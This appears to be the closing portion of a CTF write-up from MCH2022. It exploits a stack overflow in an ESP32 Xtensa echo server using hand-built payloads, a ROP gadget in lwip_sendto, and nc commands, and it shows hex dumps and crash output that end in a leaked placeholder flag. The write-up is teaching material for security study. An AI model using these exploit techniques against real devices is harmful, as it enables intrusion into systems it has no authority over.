+</section>
+</section>
+<section id="crafting-an-exploit-act-2-let-s-make-it-dance-maybe">
+<h2><a class="toc-backref" href="#id25">Crafting an exploit, act 2: Let’s make it dance! Maybe.</a><a class="headerlink" href="#crafting-an-exploit-act-2-let-s-make-it-dance-maybe" title="Permalink to this headline">#</a></h2>
+<p>Okay wow, that’s a huge success! Now let’s see if we can actually make the app execute code of our choosing! Let’s put some simple code into our scratch buffer and see if we can return into it.</p>
+<p>Copy <code class="docutils literal notranslate"><span class="pre">payload1-nocrash.bin</span></code> into <code class="docutils literal notranslate"><span class="pre">payload2-codeonstack.bin</span></code> and open it in the hex editor. As for code to execute, let’s start simple and mimick a simple <code class="docutils literal notranslate"><span class="pre">return</span> <span class="pre">0</span></code> which we copy from <code class="docutils literal notranslate"><span class="pre">do_echo</span></code>:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="mi">400</span><span class="n">d7388</span> <span class="mi">0</span><span class="n">c</span> <span class="mi">02</span>           <span class="n">movi</span><span class="o">.</span><span class="n">n</span>     <span class="n">a2</span><span class="p">,</span><span class="mh">0x0</span>
+<span class="mi">400</span><span class="n">d738a</span> <span class="mi">1</span><span class="n">d</span> <span class="n">f0</span>           <span class="n">retw</span><span class="o">.</span><span class="n">n</span>
+</pre></div>
+</div>
+<p>The buffer starts at 0x3ffbf170, so let’s use that as our first return address. So we change the first 4 bytes of the payload to contain our instructions, and the first return address to 0xbffbf170, remembering that the top two bits must be 0b10 to encode the register window shift amount:</p>
+<blockquote>
+<div><p><code class="docutils literal notranslate"><span class="pre">xxd</span> <span class="pre">-g1</span> <span class="pre">payload2-codeonstack.bin</span></code></p>
+</div></blockquote>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>00000000: 0c 02 1d f0 61 73 64 66 61 73 64 66 61 73 64 66  ....asdfasdfasdf
+00000010: 61 73 64 66 61 73 64 66 61 73 64 66 61 73 64 66  asdfasdfasdfasdf
+00000020: 41 34 41 34 41 35 41 35 41 36 41 36 41 37 41 37  A4A4A5A5A6A6A7A7
+00000030: 70 f1 fb bf d0 f1 fb 3f 43 32 43 32 43 33 43 33  p......?C2C2C3C3
+00000040: 42 34 42 34 42 35 42 35 42 36 42 36 42 37 42 37  B4B4B5B5B6B6B7B7
+00000050: a3 73 0d 80 f0 f1 fb 3f 44 32 44 32 44 33 44 33  .s.....?D2D2D3D3
+00000060: 43 34 43 34 43 35 43 35 43 36 43 36 43 37 43 37  C4C4C5C5C6C6C7C7
+00000070: a3 73 0d 80 10 f2 fb 3f 45 32 45 32 45 33 45 33  .s.....?E2E2E3E3
+00000080: 44 34 44 34 44 35 44 35 44 36 44 36 44 37 44 37  D4D4D5D5D6D6D7D7
+00000090: a3 73 0d 80 30 f2 fb 3f 46 32 46 32 46 33 46 33  .s..0..?F2F2F3F3
+000000a0: 45 34 45 34 45 35 45 35 45 36 45 36 45 37 45 0a  E4E4E5E5E6E6E7E.
+</pre></div>
+</div>
+<p>Sweet, let’s test this!</p>
+<blockquote>
+<div><p><code class="docutils literal notranslate"><span class="pre">cat</span> <span class="pre">payload2-codeonstack.bin</span> <span class="pre">|</span> <span class="pre">nc</span> <span class="pre">-N</span> <span class="pre">192.168.178.50</span> <span class="pre">1337</span> <span class="pre">|</span> <span class="pre">dd</span> <span class="pre">bs=1</span> <span class="pre">skip=22</span> <span class="pre">|</span> <span class="pre">xxd</span> <span class="pre">-g</span> <span class="pre">1</span></code></p>
+</div></blockquote>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Guru</span> <span class="n">Meditation</span> <span class="n">Error</span><span class="p">:</span> <span class="n">Core</span>  <span class="mi">0</span> <span class="n">panic</span><span class="s1">&#39;ed (IllegalInstruction). Exception was unhandled.</span>
+
+<span class="n">Core</span>  <span class="mi">0</span> <span class="n">register</span> <span class="n">dump</span><span class="p">:</span>
+<span class="n">PC</span>      <span class="p">:</span> <span class="mh">0x7ffbf170</span>  <span class="n">PS</span>      <span class="p">:</span> <span class="mh">0x00060530</span>  <span class="n">A0</span>      <span class="p">:</span> <span class="mh">0x800d73a3</span>  <span class="n">A1</span>      <span class="p">:</span> <span class="mh">0x3ffbf1f0</span>
+<span class="n">A2</span>      <span class="p">:</span> <span class="mh">0x32443244</span>  <span class="n">A3</span>      <span class="p">:</span> <span class="mh">0x33443344</span>  <span class="n">A4</span>      <span class="p">:</span> <span class="mh">0x34443444</span>  <span class="n">A5</span>      <span class="p">:</span> <span class="mh">0x35443544</span>
+<span class="n">A6</span>      <span class="p">:</span> <span class="mh">0x36443644</span>  <span class="n">A7</span>      <span class="p">:</span> <span class="mh">0x37443744</span>  <span class="n">A8</span>      <span class="p">:</span> <span class="mh">0xbffbf170</span>  <span class="n">A9</span>      <span class="p">:</span> <span class="mh">0x3ffbf1d0</span>
+<span class="n">A10</span>     <span class="p">:</span> <span class="mh">0x00000001</span>  <span class="n">A11</span>     <span class="p">:</span> <span class="mh">0x33433343</span>  <span class="n">A12</span>     <span class="p">:</span> <span class="mh">0x34433443</span>  <span class="n">A13</span>     <span class="p">:</span> <span class="mh">0x35433543</span>
+<span class="n">A14</span>     <span class="p">:</span> <span class="mh">0x36433643</span>  <span class="n">A15</span>     <span class="p">:</span> <span class="mh">0x37433743</span>  <span class="n">SAR</span>     <span class="p">:</span> <span class="mh">0x0000000e</span>  <span class="n">EXCCAUSE</span><span class="p">:</span> <span class="mh">0x00000000</span>
+<span class="n">EXCVADDR</span><span class="p">:</span> <span class="mh">0x00000000</span>  <span class="n">LBEG</span>    <span class="p">:</span> <span class="mh">0x4000c2e0</span>  <span class="n">LEND</span>    <span class="p">:</span> <span class="mh">0x4000c2f6</span>  <span class="n">LCOUNT</span>  <span class="p">:</span> <span class="mh">0xffffffff</span>
+</pre></div>
+</div>
+<p>Sadface :(</p>
+<p>Well, what happened there? The core <em>did</em> jump to our desired address… almost. Except for the top two bits, which we cannot control via <code class="docutils literal notranslate"><span class="pre">callN</span></code>/<code class="docutils literal notranslate"><span class="pre">retw</span></code> and which therefore stayed at 0b01, turning our address from 0x3ffbf170 into 0x7ffbf170.</p>
+<p>Welp, looks like the easy way of putting code into the stack won’t work. Lucky for us, there’s plenty of code already there for us to use :)</p>
+</section>
+<section id="crafting-an-exploit-act-3-using-what-s-already-there">
+<h2><a class="toc-backref" href="#id26">Crafting an exploit, act 3: Using what’s already there</a><a class="headerlink" href="#crafting-an-exploit-act-3-using-what-s-already-there" title="Permalink to this headline">#</a></h2>
+<p>If we can’t put our own code onto the stack, we can still use the code that’s already there. The app is over 1MiB, there <em>must</em> be a sequence we can use somewhere in there.</p>
+<p>What we’re looking for is a sequence of instructions that does a lot of what we need and doesn’t to a lot more before hitting a <code class="docutils literal notranslate"><span class="pre">retw</span></code> instruction. We can then craft a return address on our stack that “returns” right to the start of that sequence (which may well be in the middle of a completely unrelated function, guess how much I care). If the sequence doesn’t do all that we need, we have more stack frames we can use to jump to other sequences until we reach our goal.</p>
+<p>You probably know what I’m talking about here - this method is called “<a class="reference external" href="https://en.wikipedia.org/wiki/Return-oriented_programming">Return-oriented programming</a>” or ROP for short, and the sequences we’re looking for are called “ROP gadgets”.</p>
+<section id="finding-the-inspector-4">
+<h3>Finding the Inspector <a class="footnote-reference brackets" href="#id12" id="id8">4</a><a class="headerlink" href="#finding-the-inspector-4" title="Permalink to this headline">#</a></h3>
+<p>Since our goal is to call <code class="docutils literal notranslate"><span class="pre">lwip_send</span></code> with parameters of our choosing, let’s look for a place that calls it:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">lwip_send</span>     <span class="n">XREF</span><span class="p">[</span><span class="mi">6</span><span class="p">]:</span>     <span class="n">Entry</span> <span class="n">Point</span><span class="p">(</span><span class="o">*</span><span class="p">),</span>
+                           <span class="n">do_echo</span><span class="p">:</span><span class="mi">400</span><span class="n">d737f</span><span class="p">(</span><span class="o">*</span><span class="p">),</span>
+                           <span class="n">echo_server</span><span class="p">:</span><span class="mi">400</span><span class="n">d7667</span><span class="p">(</span><span class="o">*</span><span class="p">),</span>
+                           <span class="n">lwip_sendto</span><span class="p">:</span><span class="mi">40100</span><span class="n">f35</span><span class="p">(</span><span class="o">*</span><span class="p">),</span>
+                           <span class="n">lwip_write</span><span class="p">:</span><span class="mi">401011</span><span class="n">f6</span><span class="p">(</span><span class="o">*</span><span class="p">),</span>
+                           <span class="o">.</span><span class="n">debug_frame</span><span class="p">::</span><span class="mi">000125</span><span class="n">f8</span><span class="p">(</span><span class="o">*</span><span class="p">)</span>
+</pre></div>
+</div>
+<p><code class="docutils literal notranslate"><span class="pre">lwip_sendto</span></code> uses a stack variable for the <code class="docutils literal notranslate"><span class="pre">flags</span></code> parameter:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="mi">40100</span><span class="n">f2d</span> <span class="n">d8</span> <span class="n">c1</span>           <span class="n">l32i</span><span class="o">.</span><span class="n">n</span>     <span class="n">a13</span><span class="p">,</span><span class="n">a1</span><span class="p">,</span><span class="mh">0x30</span><span class="o">=&gt;</span><span class="n">Stack</span><span class="p">[</span><span class="mh">0x30</span><span class="p">]</span>
+<span class="mi">40100</span><span class="n">f2f</span> <span class="n">cd</span> <span class="mi">04</span>           <span class="n">mov</span><span class="o">.</span><span class="n">n</span>      <span class="n">a12</span><span class="p">,</span><span class="n">size</span>
+<span class="mi">40100</span><span class="n">f31</span> <span class="n">bd</span> <span class="mi">03</span>           <span class="n">mov</span><span class="o">.</span><span class="n">n</span>      <span class="n">a11</span><span class="p">,</span><span class="n">data</span>
+<span class="mi">40100</span><span class="n">f33</span> <span class="n">ad</span> <span class="mi">02</span>           <span class="n">mov</span><span class="o">.</span><span class="n">n</span>      <span class="n">a10</span><span class="p">,</span><span class="n">s</span>
+<span class="mi">40100</span><span class="n">f35</span> <span class="mi">65</span> <span class="mi">15</span> <span class="mi">00</span>        <span class="n">call8</span>      <span class="n">lwip_send</span>
+<span class="mi">40100</span><span class="n">f38</span> <span class="mi">2</span><span class="n">d</span> <span class="mi">0</span><span class="n">a</span>           <span class="n">mov</span><span class="o">.</span><span class="n">n</span>      <span class="n">s</span><span class="p">,</span><span class="n">a10</span>
+<span class="mi">40100</span><span class="n">f3a</span> <span class="mi">86</span> <span class="mi">52</span> <span class="mi">00</span>        <span class="n">j</span>          <span class="n">LAB_40101088</span>      <span class="p">;</span> <span class="n">jumps</span> <span class="n">to</span> <span class="n">a</span> <span class="n">retw</span>
+</pre></div>
+</div>
+<p><code class="docutils literal notranslate"><span class="pre">lwip_write</span></code> simply sets it to zero which is what we need:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="mi">401011</span><span class="n">eb</span> <span class="n">d2</span> <span class="n">a0</span> <span class="mi">00</span>        <span class="n">movi</span>       <span class="n">a13</span><span class="p">,</span><span class="mh">0x0</span>
+<span class="mi">401011</span><span class="n">ee</span> <span class="mi">40</span> <span class="n">c4</span> <span class="mi">20</span>        <span class="n">mov</span>        <span class="n">a12</span><span class="p">,</span><span class="n">size</span>
+<span class="mi">401011</span><span class="n">f1</span> <span class="mi">30</span> <span class="n">b3</span> <span class="mi">20</span>        <span class="n">mov</span>        <span class="n">a11</span><span class="p">,</span><span class="n">data</span>
+<span class="mi">401011</span><span class="n">f4</span> <span class="n">ad</span> <span class="mi">02</span>           <span class="n">mov</span><span class="o">.</span><span class="n">n</span>      <span class="n">a10</span><span class="p">,</span><span class="n">s</span>
+<span class="mi">401011</span><span class="n">f6</span> <span class="mi">65</span> <span class="n">e9</span> <span class="n">ff</span>        <span class="n">call8</span>      <span class="n">lwip_send</span>
+<span class="mi">401011</span><span class="n">f9</span> <span class="mi">2</span><span class="n">d</span> <span class="mi">0</span><span class="n">a</span>           <span class="n">mov</span><span class="o">.</span><span class="n">n</span>      <span class="n">s</span><span class="p">,</span><span class="n">a10</span>
+<span class="mi">401011</span><span class="n">fb</span> <span class="mi">1</span><span class="n">d</span> <span class="n">f0</span>           <span class="n">retw</span><span class="o">.</span><span class="n">n</span>
+</pre></div>
+</div>
+<p>Normally it would be a no-brainer to pick <code class="docutils literal notranslate"><span class="pre">lwip_write</span></code> for our gadget, specifically the instruction sequence starting at 0x401011eb, but I’d like to make a point and choose the more complicated path by picking <code class="docutils literal notranslate"><span class="pre">lwip_sendto</span></code> :)</p>
+<p>You see, we’re not gonna need that instruction at 0x40100f2d if we can control <code class="docutils literal notranslate"><span class="pre">a13</span></code> directly. And <code class="docutils literal notranslate"><span class="pre">a13</span></code> used to be called <code class="docutils literal notranslate"><span class="pre">a5</span></code> one stack frame ago because of the moving window. So we can control, say, frame D’s <code class="docutils literal notranslate"><span class="pre">a13</span></code> simply by controlling frame C’s <code class="docutils literal notranslate"><span class="pre">a5</span></code>.</p>
+<p>So we have <em>almost</em> all we need:</p>
+<ul class="simple">
+<li><p>Control over <code class="docutils literal notranslate"><span class="pre">a2..a4</span></code> for parameters set up by the gadget</p></li>
+<li><p>Control over <code class="docutils literal notranslate"><span class="pre">a13</span></code> for the parameters <em>not</em> set up by the gadget</p></li>
+<li><p>The values of the <code class="docutils literal notranslate"><span class="pre">size</span></code> and <code class="docutils literal notranslate"><span class="pre">data</span></code> parameters (our flag and its size)</p></li>
+</ul>
+<p>The last piece to the puzzle is the value of <code class="docutils literal notranslate"><span class="pre">s</span></code> or <code class="docutils literal notranslate"><span class="pre">sock</span></code>, but we can dump that out by patching the app once again. A few re-runs of the app reveal that <code class="docutils literal notranslate"><span class="pre">sock</span></code> is always 0x37 so we can hardcode that value too.</p>
+</section>
+<section id="could-this-be-it">
+<h3>Could this be it?<a class="headerlink" href="#could-this-be-it" title="Permalink to this headline">#</a></h3>
+<p>So let’s make another copy of <code class="docutils literal notranslate"><span class="pre">payload1-nocrash.bin</span></code> called <code class="docutils literal notranslate"><span class="pre">payload3-allyourbase.bin</span></code> and edit it thusly:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">frame</span> <span class="n">C</span> <span class="n">a0</span> <span class="o">=</span> <span class="mh">0x80100f2f</span>  <span class="p">(</span><span class="n">our</span> <span class="n">gadget</span><span class="p">,</span> <span class="k">with</span> <span class="n">top</span> <span class="n">two</span> <span class="n">bits</span> <span class="o">=</span> <span class="mb">0b10</span><span class="p">)</span>
+<span class="n">frame</span> <span class="n">C</span> <span class="n">a5</span> <span class="o">=</span> <span class="mi">0</span>           <span class="p">(</span><span class="n">flags</span><span class="p">)</span>
+<span class="n">frame</span> <span class="n">D</span> <span class="n">a2</span> <span class="o">=</span> <span class="mh">0x37</span>        <span class="p">(</span><span class="n">s</span> <span class="o">-</span> <span class="n">the</span> <span class="n">socket</span><span class="p">)</span>
+<span class="n">frame</span> <span class="n">D</span> <span class="n">a3</span> <span class="o">=</span> <span class="mh">0x3ffb5358</span>  <span class="p">(</span><span class="n">data</span> <span class="o">-</span> <span class="n">our</span> <span class="n">flag</span><span class="p">)</span>
+<span class="n">frame</span> <span class="n">D</span> <span class="n">a4</span> <span class="o">=</span> <span class="mh">0x26</span>        <span class="p">(</span><span class="n">size</span> <span class="o">-</span> <span class="n">size</span> <span class="n">of</span> <span class="n">the</span> <span class="n">flag</span><span class="p">)</span>
+</pre></div>
+</div>
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>Wonder why we’re setting frame C <code class="docutils literal notranslate"><span class="pre">a0</span></code> to our gadget when we want to jump there from frame D? I did too, when at first I used frame D <code class="docutils literal notranslate"><span class="pre">a0</span></code> and nothing worked ;)</p>
+<p>The trick is we don’t want to jump to the gadget from frame D, we want to jump there <em>from frame C</em> so that our gadget <em>runs within frame D</em>. That way its <code class="docutils literal notranslate"><span class="pre">a2..a4</span></code> will be set as we need them, and frame C’s <code class="docutils literal notranslate"><span class="pre">a5</span></code> will have shifted into <code class="docutils literal notranslate"><span class="pre">a13</span></code>.</p>
+</div>
+<p>The payload now should look somewhat like this:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>00000000: 61 73 64 66 61 73 64 66 61 73 64 66 61 73 64 66  asdfasdfasdfasdf
+00000010: 61 73 64 66 61 73 64 66 61 73 64 66 61 73 64 66  asdfasdfasdfasdf
+00000020: 41 34 41 34 41 35 41 35 41 36 41 36 41 37 41 37  A4A4A5A5A6A6A7A7
+00000030: 2f 0f 10 80 d0 f1 fb 3f 43 32 43 32 43 33 43 33  /......?C2C2C3C3
+00000040: 42 34 42 34 42 35 42 35 42 36 42 36 42 37 42 37  B4B4B5B5B6B6B7B7
+00000050: a3 73 0d 80 f0 f1 fb 3f 37 00 00 00 58 53 fb 3f  .s.....?7...XS.?
+00000060: 43 34 43 34 00 00 00 00 43 36 43 36 43 37 43 37  C4C4....C6C6C7C7
+00000070: a3 73 0d 80 10 f2 fb 3f 45 32 45 32 45 33 45 33  .s.....?E2E2E3E3
+00000080: 26 00 00 00 44 35 44 35 44 36 44 36 44 37 44 37  &amp;...D5D5D6D6D7D7
+00000090: a3 73 0d 80 30 f2 fb 3f 46 32 46 32 46 33 46 33  .s..0..?F2F2F3F3
+000000a0: 45 34 45 34 45 35 45 35 45 36 45 36 45 37 45 0a  E4E4E5E5E6E6E7E.
+</pre></div>
+</div>
+<p>With trembling fingers, we enter the command to send it to our target… just kidding, what’s a shell history for? <em>&lt;hits cursor-up and edits the last command&gt;</em></p>
+<blockquote>
+<div><p><code class="docutils literal notranslate"><span class="pre">cat</span> <span class="pre">payload3-allyourbase.bin</span> <span class="pre">|</span> <span class="pre">nc</span> <span class="pre">-w</span> <span class="pre">5</span> <span class="pre">192.168.178.50</span> <span class="pre">1337</span> <span class="pre">|</span> <span class="pre">dd</span> <span class="pre">bs=1</span> <span class="pre">skip=22</span> <span class="pre">|</span> <span class="pre">xxd</span> <span class="pre">-g</span> <span class="pre">1</span></code></p>
+</div></blockquote>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>00000000: 61 73 64 66 61 73 64 66 61 73 64 66 61 73 64 66  asdfasdfasdfasdf
+00000010: 61 73 64 66 61 73 64 66 61 73 64 66 61 73 64 66  asdfasdfasdfasdf
+00000020: 90 0a fb 3f 00 39 40 3f 41 36 41 36 41 37 41 37  ...?.9@?A6A6A7A7
+00000030: 2f 0f 10 80 d0 f1 fb 3f 43 32 43 32 43 33 43 33  /......?C2C2C3C3
+00000040: 42 34 42 34 42 35 42 35 42 36 42 36 42 37 42 37  B4B4B5B5B6B6B7B7
+00000050: a3 73 0d 80 f0 f1 fb 3f 37 00 00 00 58 53 fb 3f  .s.....?7...XS.?
+00000060: 43 34 43 34 00 00 00 00 43 36 43 36 43 37 43 37  C4C4....C6C6C7C7
+00000070: a3 73 0d 80 10 f2 fb 3f 45 32 45 32 45 33 45 33  .s.....?E2E2E3E3
+00000080: 26 00 00 00 44 35 44 35 44 36 44 36 44 37 44 37  &amp;...D5D5D6D6D7D7
+00000090: a3 73 0d 80 30 f2 fb 3f 46 32 46 32 46 33 46 33  .s..0..?F2F2F3F3
+000000a0: 45 34 45 34 45 35 45 35 45 36 45 36 45 37 45 0a  E4E4E5E5E6E6E7E.
+000000b0: 66 6c 61 67 7b 6e 6f 74 5f 61 5f 72 65 61 6c 5f  flag{not_a_real_
+000000c0: 66 6c 61 67 7d 00 00 00 00 00 00 00 00 00 00 00  flag}...........
+000000d0: 00 00 00 00 00 00                                ......
+</pre></div>
+</div>
+<p><strong>And there it is - our tasty, tasty flag!</strong></p>
+<div class="admonition tip">
+<p class="admonition-title">Tip</p>
+<p>There are so many ways to skin this ROP cat (you monsters! the poor cat!) and this is only one of them. For exercise, you could try some other approaches:</p>
+<ul class="simple">
+<li><p>Make your life easy as you should and use <code class="docutils literal notranslate"><span class="pre">lwip_write</span></code> for the gadget.</p></li>
+<li><p>Forgo the gadgets altogether, set up <code class="docutils literal notranslate"><span class="pre">a10..13</span></code> directly and return right to the start of <code class="docutils literal notranslate"><span class="pre">lwip_send</span></code>.</p></li>
+</ul>
+</div>
+</section>
+</section>
+<section id="recap">
+<h2><a class="toc-backref" href="#id27">Recap</a><a class="headerlink" href="#recap" title="Permalink to this headline">#</a></h2>
+<p>Let’s review what all we just accomplished, shall we?</p>
+<ol class="arabic simple">
+<li><p>We poked around the app, found a way to crash it and a debug console.</p></li>
+<li><p>We loaded the app into Ghidra, understood the app initialization and discovered that it’s a simple TCP echo server.</p></li>
+<li><p>We reverse engineered the echo server and understood the nature and exploitability of the bug that crashes it.</p></li>
+<li><p>We learned about movable register windows and weirdly distributed stack frames on the Xtensa architecture.</p></li>
+<li><p>We patched the ESP app to extract internal values via the debug console.</p></li>
+<li><p>We crafted multiple exploit payloads by hand, using nothing but a hex editor.</p></li>
+<li><p>We discovered a ROP gadget and used it to our advantage.</p></li>
+<li><p>WE GOT THE $&amp;/)!”$(”§$%)( FLAG! \o/</p></li>
+</ol>
+<p>That’s quite a lot to accomplish and you can be proud of yourself. I know I am :)</p>
+</section>
+<section id="closing-words">
+<h2><a class="toc-backref" href="#id28">Closing words</a><a class="headerlink" href="#closing-words" title="Permalink to this headline">#</a></h2>
+<p>Thanks for making it through to the end of this writeup. Really, I mean it. The RST source for this grew into a 57KiB behemoth so it’s quite a mouthful - thank you for bearing with my ramblings. I tried to make this piece both insightful and entertaining and am hoping I succeeded at both.</p>
+<p>Mad props must go first of all to my partners in crime at Team <a class="reference external" href="https://ctf.mch2022.org/user?id=20">Bratzenamt</a>: <a class="reference external" href="https://twitter.com/hwl_micha">DoubleJ</a>, ove, Y0Gi, Jo, Jo2 and Jake.</p>
+<p>Many thanks also go to the <a class="reference external" href="https://twitter.com/MCH2022CTF">MCH2022 CTF team</a> for creating a very diverse and interesting CTF that kept us puzzling throughout the camp, and to the <a class="reference external" href="https://www.badge.team/team/">MCH2022 Badge team</a> for providing a <em>ridiculously</em> complex and feature-rich badge that will keep us occupied for a long time!</p>
+<p>That’s all for now. See you at the next CTF! o/</p>
+</section>
+<section id="footnotes">
+<h2><a class="toc-backref" href="#id29">Footnotes</a><a class="headerlink" href="#footnotes" title="Permalink to this headline">#</a></h2>
+<dl class="footnote brackets">
+<dt class="label" id="id9"><span class="brackets"><a class="fn-backref" href="#id4">1</a></span></dt>
+<dd><p>After MCH2022 was over, <a class="reference external" href="https://twitter.com/hwl_micha">DoubleJ</a> found out that there’s a bleeding edge version of the plugin that <em>does</em> support decompilation: The <a class="reference external" href="https://github.com/Ebiroll/ghidra-xtensa">fork by Ebiroll</a> appears to have decompiler support; you may have to merge a <a class="reference external" href="https://github.com/Ebiroll/ghidra-xtensa/pull/2">pending PR</a> to make it work, or again if you trust DoubleJ you can use <a class="reference external" href="ghidra-xtensa-f7bae2c.zip">this pre-built release</a>. Nevertheless, we’ll keep working without the decompiler in this writeup because that’s what I did during the CTF and hardship builds character ;)</p>
+</dd>
+<dt class="label" id="id10"><span class="brackets"><a class="fn-backref" href="#id5">2</a></span></dt>
+<dd><p>I should mention that I knew exactly <em>nothing</em> about ESP programming before embarking on this challenge, so if this sounds like CptObvs to you please bear with me and consider it a lesson in approaching an unknown target ;)</p>
+</dd>
+<dt class="label" id="id11"><span class="brackets"><a class="fn-backref" href="#id6">3</a></span></dt>
+<dd><p>Any of <code class="docutils literal notranslate"><span class="pre">a1</span></code>, <code class="docutils literal notranslate"><span class="pre">a2</span></code> or <code class="docutils literal notranslate"><span class="pre">a3</span></code> may in theory serve as stack pointer but let’s go with <code class="docutils literal notranslate"><span class="pre">a1</span></code> for simplicity.</p>
+</dd>
+<dt class="label" id="id12"><span class="brackets"><a class="fn-backref" href="#id8">4</a></span></dt>
+<dd><p>I’m sure it’s required by law to make a stupid Inspector Gadget joke when talking about ROP.</p>
+</dd>
+</dl>
+</section>
+</section>
+
+
+              </div>
+              
+            </main>
+            <footer class="footer-article noprint">
+                
+    <!-- Previous / next buttons -->
+<div class='prev-next-area'>
+</div>
+            </footer>
+        </div>
+    </div>
+    <div class="footer-content row">
+        <footer class="col footer"><p>
+  
+    By dojoe<br/>
+  
+      &copy; Copyright 2022, dojoe.<br/>
+</p>
+        </footer>
+    </div>
+    
+</div>
+
+
+      </div>
+    </div>
+  
+  <!-- Scripts loaded after <body> so the DOM is not blocked -->
+  <script src="_static/scripts/pydata-sphinx-theme.js?digest=1999514e3f237ded88cf"></script>
+
+
+  </body>
+</html>
